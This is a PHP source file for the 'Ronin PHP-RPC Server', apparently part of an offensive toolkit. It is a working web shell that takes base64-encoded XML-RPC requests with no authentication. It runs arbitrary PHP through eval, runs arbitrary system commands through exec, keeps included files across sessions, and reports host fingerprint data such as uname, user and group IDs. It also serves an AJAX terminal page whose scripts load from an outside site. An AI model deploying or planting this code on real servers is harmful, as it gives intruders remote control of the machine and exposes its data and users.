<!--
 Ronin PHP-RPC Server - A PHP-RPC server designed to work in hostile
 environments.

 Copyright (c) 2007-2008

 This program is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation; either version 2 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
-->

<?php

class RPCServer
{
  var $_server;

  var $services;

  function RPCServer()
  {
    $this->_server = xmlrpc_server_create();
    $this->services = array();
  }

  function load_session()
  {
    foreach (array_values($this->services) as $service)
    {
      $service->load_session();
    }
  }

  function register_method($name,$function)
  {
    return xmlrpc_server_register_method($this->_server, $name, $function);
  }

  function register_service($name,$service)
  {
    $this->services[] = $service;

    foreach ($service->methods as $rpc_name => $method)
    {
      $this->register_method("{$name}.{$rpc_name}",array(&$service, $method));
    }
  }

  function call_method($xml)
  {
    return xmlrpc_server_call_method($this->_server, $xml, null);
  }

  function rpc_services($method)
  {
    return array_keys($this->services);
  }

  function save_session()
  {
    foreach ($this->services as $name => $service)
    {
      $service->save_session();
    }
  }
}

class Service
{

  var $methods;

  function Service()
  {
    $this->methods = array();
  }

  function load_session() {}

  function save_session() {}

}

class ConsoleService extends Service
{

  var $includes;

  function ConsoleService()
  {
    $this->methods = array(
      'invoke' => 'rpc_invoke',
      'fingerprint' => 'rpc_fingerprint'
    );
  }

  function load_session()
  {
    if (isset($_SESSION['rpc_includes']))
    {
      $this->includes = unserialize($_SESSION['rpc_includes']);

      foreach ($this->includes as $path)
      {
        include($path);
      }
    }
  }

  function rpc_invoke($method,$params)
  {
    $name = $params[0];
    $arguments = $params[1];
    $call_arguments = array();

    if ($arguments != null)
    {
      foreach(array_keys($arguments) as $index)
      {
        $call_arguments[$index] = "\$arguments[{$index}]";
      }
    }

    $call_string = "return {$name}(" . join($call_arguments, ", ") . ");";
    $ret = eval($call_string);

    if (($name == 'include' || $name == 'require') && $ret != false)
    {
      $this->includes[] = $arguments[0];
    }

    return $ret;
  }

  function rpc_fingerprint($method,$params)
  {
    $profile = array(
      'uname' => php_uname(),
      'php_server_api' => php_sapi_name(),
      'php_version' => phpversion(),
      'uid' => posix_getuid(),
      'gid' => posix_getgid(),
      'cwd' => getcwd(),
      'disk_free_space' => disk_free_space('/'),
      'disk_total_space' => disk_total_space('/')
    );

    switch ($profile['php_server_api'])
    {
      case 'apache':
        $profile['apache_version'] = apache_get_version();
        break;
    }

    return $profile;
  }

  function save_session()
  {
    $_SESSION['rpc_includes'] = serialize($this->includes);
  }

}

class ShellService extends Service
{

  function ShellService()
  {
    $this->methods = array('exec' => 'rpc_exec');
  }

  function rpc_exec($method,$arguments)
  {
    $command = join($arguments, ' ');
    $output = array();

    exec($command, &$output);

    return join($output, "\n");
  }

}


if (isset($_REQUEST['rpc_call']))
{
  $server = new RPCServer();
  $server->register_service('console', new ConsoleService());
  $server->register_service('shell', new ShellService());

  $server->load_session();

  $xml = base64_decode(urldecode($_REQUEST['rpc_call']));

  echo('<rpc>');
  echo($server->call_method($xml));
  echo('</rpc>');

  $server->save_session();

  exit(0);
}
else
{
  echo("</html>\n");
}

?>

<html>
  <head>
    <title>Ronin::PHP - AJAX PHP-RPC Console</title>
    <link rel="stylesheet" type="text/css" href="http://ronin.rubyforge.org/dist/php/rpc/ajax/css/layout.css" />
    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/base64.js"></script>
    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery-1.2.6.min.js"></script>
    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery-ui-personalized-1.5.2.min.js"></script>
    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery.terminal.js"></script>
    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery.xmlrpc.js"></script>
    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/ui.js"></script>

    <script type="text/javascript" language="javascript">
      $(document).ready(function() {
        $("#console_tabs > ul").tabs();
        $("#console_shell").terminal(function(input) {
          shell.exec(input);
        });

        $("#console_title").hide();

        $("#console_title").fadeIn(1500, function() {
          $("#console_shell").terminalFocus();
        });
      });
    </script>
  </head>

  <body>
    <div id="console_container">
      <h1 id="console_title">AJAX PHP-RPC Console v0.9</h1>

      <div id="console_content">
        <div id="console_tabs">
          <ul>
            <li><a href="#console_shell"><span>Console</span></a></li>
            <li><a href="#console_info"><span>Fingerprint</span></a></li>
          </ul>

          <div id="console_shell" class="console_tab"></div>

          <div id="console_info" class="console_tab">
            <div class="console_dialogue">
              <p>
              PHP Version: <br />
              PHP Process ID: <br />
              PHP Current Working Directory: <br />
              PHP User ID: <br />
              PHP Group ID: 
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
